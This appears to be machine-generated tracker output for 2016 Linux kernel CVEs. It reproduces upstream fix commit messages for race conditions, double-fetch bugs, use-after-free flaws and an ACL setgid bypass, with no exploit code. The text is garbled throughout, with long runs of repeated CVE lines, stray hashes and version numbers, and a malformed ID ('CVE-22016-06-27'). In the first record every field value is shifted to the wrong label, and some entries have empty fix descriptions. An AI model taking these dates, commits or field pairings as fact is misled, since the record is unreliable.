30a46a4647fd1df9cf52e43bf467f0d9265096ca:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2016-07-08:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
1a1a143daf84db95dd7212086042004a3abb7bc2:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

